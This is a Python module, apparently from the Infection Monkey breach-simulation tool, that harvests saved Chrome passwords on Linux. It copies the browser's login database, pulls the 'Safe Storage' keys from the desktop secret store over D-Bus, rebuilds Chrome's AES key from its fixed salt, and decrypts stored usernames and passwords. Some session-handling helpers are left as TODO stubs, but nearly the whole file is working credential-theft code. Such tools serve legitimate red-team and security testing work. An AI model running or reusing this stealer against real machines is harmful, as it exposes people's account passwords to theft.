from typing import Collection
import logging
import os
import shutil
import sqlite3
from dataclasses import dataclass
from hashlib import pbkdf2_hmac
from itertools import chain
from pathlib import Path, PurePath
from typing import Iterator, Sequence, Set, Tuple

import secretstorage

from common.credentials import Credentials, Password, Username
from common.types import Event
from infection_monkey.utils.threading import interruptible_iter

from .decrypt import AESModeOfOperationCBC, decrypt_v80


@dataclass
class EncryptionConfig:
    iv: bytes
    length: int
    salt: bytes
    iterations: int


logger = logging.getLogger(__name__)

AES_BLOCK_SIZE = 16
ENC_CONFIG = EncryptionConfig(
    iv=b" " * 16,
    length=16,
    salt=b"saltysalt",
    iterations=1,
)

from .browser_credentials_database_path import BrowserCredentialsDatabasePath


class LinuxCredentialsDatabaseProcessor:
    def __init__(self):
        pass

    def __call__(
        self, interrupt: Event, database_paths: Collection[BrowserCredentialsDatabasePath]
    ) -> Collection[Credentials]:
        credentials = chain.from_iterable(map(self._process_database_path, database_paths))
        return list(interruptible_iter(credentials, interrupt))

    def _process_database_path(self, database_path: PurePath) -> Iterator[Credentials]:
        path = Path(database_path)
        if path.is_file():
            tmp = "/tmp/chrome.db"
            shutil.copyfile(path, tmp)

            conn = sqlite3.connect(tmp)
            try:
                yield from self._process_database(conn)
            except Exception:
                logger.exception(f"Error encountered while processing database {database_path}")
            finally:
                conn.close()

            os.remove(tmp)

    def _process_database(self, connection: sqlite3.Connection) -> Iterator[Credentials]:
        for user, password in connection.execute(
            "SELECT username_value,password_value FROM logins"
        ):
            try:
                yield Credentials(
                    identity=Username(username=user), secret=self._get_password(password)
                )
            except Exception:
                continue

    def _get_password(self, password: str) -> Password:
        if self._is_password_encrypted(password):
            return Password(password=self._decrypt_password(password))

        return Password(password=password)

    def _is_password_encrypted(self, password: str):
        return password[:3] == b"v10" or password[:3] == b"v11"

    # TODO: Finish implementing this
    def _decrypt_password(self, password: str) -> str:
        secrets = [secret for secret in _get_secrets_from_storage()]
        try:
            for css in secrets:
                enc_key = pbkdf2_hmac(
                    hash_name="sha1",
                    password=css,
                    salt=ENC_CONFIG.salt,
                    iterations=ENC_CONFIG.iterations,
                    dklen=ENC_CONFIG.length,
                )

                try:
                    plaintext = self._chrome_decrypt(
                        password, key=enc_key, init_vector=ENC_CONFIG.iv
                    )
                    return plaintext.decode()
                except UnicodeDecodeError:
                    plaintext = decrypt_v80(password, enc_key)
                    if plaintext:
                        return plaintext
        except Exception:
            logger.exception("Failed to decrypt password")
            raise

        # If we get here, we failed to decrypt the password
        return password

    def _chrome_decrypt(self, encrypted_value, key, init_vector):
        encrypted_value = encrypted_value[3:]
        aes = AESModeOfOperationCBC(key, iv=init_vector)
        cleartxt = b"".join(
            [
                aes.decrypt(encrypted_value[i : i + AES_BLOCK_SIZE])
                for i in range(0, len(encrypted_value), AES_BLOCK_SIZE)
            ]
        )
        return self._remove_padding(cleartxt)

    def _remove_padding(self, data):
        """
        Remove PKCS#7 padding
        """
        nb = data[-1]

        try:
            return data[:-nb]
        except Exception as err:
            logger.debug(err)
            return data


# Utilities for connecting to chrome secret storage


def _get_secrets_from_storage() -> Iterator[bytes]:
    used_session_labels: Set[str] = set()
    for uid, session in _get_dbus_sessions():
        bus = _connect_to_dbus_session(uid, session)
        for collection in secretstorage.get_all_collections(bus):
            yield from _get_secrets_from_collection(collection, used_session_labels)


def _get_secrets_from_collection(
    collection: secretstorage.collection.Collection,
    used_session_labels: Set[str],
) -> Iterator[bytes]:
    if collection.is_locked():
        return

    label = collection.get_label()
    if label in used_session_labels:
        return
    used_session_labels.add(label)

    for item in collection.get_all_items():
        if item.get_label().endswith("Safe Storage"):
            yield item.get_secret()


# TODO: Determine if we need to get the uid, DBUS_SESSION_BUS_ADDRESS from the environment
def _get_dbus_sessions() -> Iterator[Tuple[str, str]]:
    yield ("uid", "session")


# TODO: Determine if we need to connect to an existing session by uid, DBUS_SESSION_BUS_ADDRESS
def _connect_to_dbus_session(uid: str, session: str) -> secretstorage.dbus.SessionBus:
    return secretstorage.dbus_init()
